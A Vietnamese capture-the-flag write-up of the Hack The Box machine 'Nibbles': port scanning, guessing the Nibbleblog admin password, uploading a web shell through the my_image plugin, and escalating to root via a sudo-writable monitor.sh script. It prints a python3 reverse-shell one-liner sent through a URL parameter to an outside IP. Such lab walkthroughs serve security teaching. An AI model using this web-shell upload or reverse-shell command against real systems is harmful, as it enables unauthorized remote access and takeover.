# Mở đầu
![](https://images.viblo.asia/b61093a3-b83f-484c-890f-12efc103825a.png)

Chúng ta tiếp tục với một machine dễ là Nibbles.

![](https://images.viblo.asia/4e77a22d-344c-41e5-802a-7de02ddc6e49.PNG)
# Write-up
## Recon 
`nmap -A -v -p- 10.10.10.75 -o nmap`

![](https://images.viblo.asia/b6337f28-4b63-45f4-94b6-e0eec7fe9475.PNG)

Ta thấy server đang mở 2 cổng là 80 và 22. Trước tiên mình sẽ vào cổng 80 xem có gì

![](https://images.viblo.asia/c3d69f34-56d7-451f-b352-3a2c191d9a97.PNG)
  
Mình thử Ctrl+U để xem mã nguồn thì phát hiện ra 1 thư mục mới 

![](https://images.viblo.asia/e70c23d7-d747-4145-9f77-21d93d32b23f.PNG)

Truy cập thử ta thấy là 1 Nibbleblog 
![](https://images.viblo.asia/0960617b-7492-4b04-a5d9-3c385feef6bb.PNG)
Sau đó mình dùng searchsploit để kiểm tra xem có gì thú vị không và mình tìm được một lỗi liên quan đến plugin cho phép upload file mà không kiểm tra.

`searchsploit nibbleblog`
![](https://images.viblo.asia/6aa101f2-046d-4179-8c2a-2ce5f6b3bd99.PNG)

Lỗi này yêu cầu xác thực nên ta phải tìm cách đăng nhập, mình sử dụng gobuster để tìm kiếm các thư mục ẩn.

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.75 -x php,txt,bak -o gobuster`

![](https://images.viblo.asia/51d0ba64-4bf8-4c70-a445-507855d71069.PNG)

Sau khi kiểm tra tất cả thư mục thì mình phát hiện được username là admin nhưng mình không thấy password ở đâu.
![](https://images.viblo.asia/d3bd32c5-2de5-4223-9f9a-d5fbdfdf8ddd.PNG)

Mình bắt đầu thử các password và sau một hồi thử thì password là nibbles :thinking::thinking:
## Exploit
Giờ ta đã có username và password tiến hành khai thác lỗi ở trên. Đăng nhập và up shell thôi.

`http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`

![](https://images.viblo.asia/d3bd32c5-2de5-4223-9f9a-d5fbdfdf8ddd.PNG)

Sau khi up shell thì sẽ được lưu tại 

`http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`

Lấy shell đầu thôi, mình kiểm tra nc không chạy nên mình sẽ dùng python3 để tạo shell 
```
10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.*.*",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Ta có shell đầu 
![](https://images.viblo.asia/306eb56b-b6ab-4915-91a3-b1c38aad14e4.PNG)
## Root
Kiểm tra xem user có thể chạy gì với sudo
`sudo -l`
![](https://images.viblo.asia/49a1819d-02ca-47f4-8184-bff9a7897d52.PNG)

Đến đây thì khá là dễ dàng ta chỉ việc tạo trong thư mục trên một file monitor. sh chứa shell 

![](https://images.viblo.asia/e13672f5-3a85-48b9-b504-66f2344fd64d.PNG)
# Conclusion
Ở bài này mình thấy mình không học được gì mới :joy::joy: